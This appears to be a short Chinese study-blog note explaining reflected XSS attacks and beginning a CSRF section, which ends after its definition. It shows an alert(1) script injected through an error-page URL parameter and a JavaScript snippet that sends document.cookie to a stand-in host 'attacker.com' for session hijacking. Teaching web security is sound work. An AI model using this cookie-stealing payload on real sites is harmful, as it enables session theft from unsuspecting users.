---
title: xss和csrf
date: 2018-07-09 11:02:34
tags: 浏览器
---

# xss

> cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）

- 主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。

## 反射型

- 如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞
- 显著特征是应用程序没有进行任何过滤和净化措施

### 案例

- 如果一个网站的错误消息是这样显示的，www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户
- www.xxx.com/error.php?message=<script>alert(1)</script>，当用户打开错误页面的时候，就会出现<p><script>alert(1)</script></p>，弹出一个消息框

- 当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。
- 截获用户的会话后，就可以访问该用户授权访问的所有数据和功能
- 比如攻击构造这样一个 url，message 信息如下

```javascript
let i = new Image();
i.src = "http://attacker.com?cookie=" + document.cookie;
```

- 由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 www.xxx.com 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。

# csrf

> cross site request forgery 的缩写，即跨站脚本请求伪造
